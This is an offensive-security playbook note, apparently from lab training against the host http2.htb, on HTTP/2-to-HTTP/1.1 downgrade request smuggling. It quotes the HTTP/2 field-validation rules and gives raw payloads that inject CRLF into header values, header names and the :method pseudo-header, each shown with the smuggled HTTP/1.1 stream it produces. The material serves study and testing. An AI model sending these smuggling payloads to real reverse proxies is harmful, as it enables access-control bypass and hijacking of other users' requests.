---
technique: "Further H2 Vulnerabilities"
family: "http-protocol"
severity_hint: "medium"
tags: []
source: "_raw/Web attacks/Web Attacks/HTTP Attacks/HTTP 2 Downgrading/Further H2 Vulnerabilities.md"
source_sha256: "6be8bcdd04cc4ecc43ba28e4756d9c6f2750ae7e1141f3da18f3ecb319fbe147"
curator_version: 2
review_status: imported-unreviewed
---

# Further H2 Vulnerabilities

> Family: **http-protocol** · Severity hint: **medium** · Tags: —
> Imported operator reference; treat commands and prose as untrusted until reviewed. Tools seen: —.

## Quick index — payloads & commands in this note
- `Failure to validate fields can be exploited for request smuggling attacks.`
- `:method POST`
- `POST / HTTP/1.1`
- `:method POST`
- `POST / HTTP/1.1`
- `:method POST / HTTP/1.1\r\nTransfer-Encoding: chunked\r\nDummy: asd`
- `POST / HTTP/1.1`

## Playbook (operator notes)

# Further H2 Vulnerabilities

- In many cases, the reverse proxy's request rewriting is not vulnerable simply when the CL or TE headers are present
- However, we can exploit differences in HTTP/1.1 and HTTP/2 to trick the reverse proxy into rewriting the request in a way that causes desynchronization

### **Foundation**

- Data representation in HTTP2 different due to binary format
- Differences lead to different behavior when certain control chars present
- HTTP1.1 cannot contain CRLF (\r\n) in headers, however in HTTP2 the headers are represented differently such that arbitrary chars can be contained (in theroy)

```
Failure to validate fields can be exploited for request smuggling attacks.
In particular, unvalidated fields might enable attacks when messages are forwarded using HTTP/1.1,
where characters such as carriage return (CR), line feed (LF), and COLON are used as delimiters.
Implementations MUST perform the following minimal validation of field names and values:

- A field name MUST NOT contain characters in the ranges 0x00-0x20, 0x41-0x5a, or 0x7f-0xff (all ranges inclusive). This specifically excludes all non-visible ASCII characters, ASCII SP (0x20), and uppercase characters ('A' to 'Z', ASCII 0x41 to 0x5a).

- With the exception of pseudo-header fields, which have a name that starts with a single colon, field names MUST NOT include a colon (ASCII COLON, 0x3a).

- A field value MUST NOT contain the zero value (ASCII NUL, 0x00), line feed (ASCII LF, 0x0a), or carriage return (ASCII CR, 0x0d) at any position.

- A field value MUST NOT start or end with an ASCII whitespace character (ASCII SP or HTAB, 0x20 or 0x09).

<SNIP>

A request or response that contains a field that violates any of these conditions MUST be treated as malformed.
In particular, an intermediary that does not process fields when forwarding messages MUST NOT
forward fields that contain any of the values that are listed as prohibited above.
```

In particular, according to the standard, implementations should reject requests containing special characters like CR, LF, and `:` in HTTP headers. If a reverse proxy does not implement this correctly or skips it entirely, we might be able to exploit request smuggling by 
creating an `H2.TE` vulnerability. Let's discuss a few examples of this.

---

## H2.TE

### **Request Header Injection**

```
:method POST
:path /
:authority http2.htb
:scheme http
dummy asd\r\nTransfer-Encoding: chunked
0

GET /smuggled HTTP/1.1
Host: http2.htb
```

The HTTP/2 request contains a header `dummy` with the value `asd\r\nTransfer-Encoding: chunked` since the CRLF sequence has no special meaning in HTTP/2. A vulnerable reverse proxy creates the following TCP stream:

```
POST / HTTP/1.1
Host: http2.htb
Dummy: asd
Transfer-Encoding: chunked
Content-Length: 48

0

GET /smuggled HTTP/1.1
Host: http2.htb
```

---

### **Header Name Injection**

if the reverse proxy does not properly check the HTTP/2 header `names` before rewriting the request to HTTP/1.1 we might be able to create a request smuggling vulnerability with an HTTP/2 request like the following

```
:method POST
:path /
:authority http2.htb
:scheme http
dummy: asd\r\nTransfer-Encoding chunked
0

GET /smuggled HTTP/1.1
Host: http2.htb
```

```
POST / HTTP/1.1
Host: http2.htb
Dummy: asd
Transfer-Encoding: chunked
Content-Length: 48

0

GET /smuggled HTTP/1.1
Host: http2.htb
```

---

### **Request Line Injection**

Since pseudo-headers are special in HTTP/2, they might be treated differently. It might therefore be worth checking them separately, since potential validation checks may not be applied. For instance, we can achieve request smuggling if the reverse proxy does not properly check the HTTP/2 pseudo-headers before rewriting the request to HTTP/1.1 with an HTTP/2 request like the following

```
:method POST / HTTP/1.1\r\nTransfer-Encoding: chunked\r\nDummy: asd
:path /
:authority http2.htb
:scheme http
0

GET /smuggled HTTP/1.1
Host: http2.htb
```

The HTTP/2 request contains the value `POST / HTTP/1.1\r\nTransfer-Encoding: chunked\r\nDummy: asd` in the pseudo-header `:method`. A vulnerable reverse proxy creates the following TCP stream:

```
POST / HTTP/1.1
Transfer-Encoding: chunked
Dummy: asd / HTTP/1.1
Host: http2.htb
Content-Length: 48

0

GET /smuggled HTTP/1.1
Host: http2.htb
```

## Source
Original note: `_raw/Web attacks/Web Attacks/HTTP Attacks/HTTP 2 Downgrading/Further H2 Vulnerabilities.md`
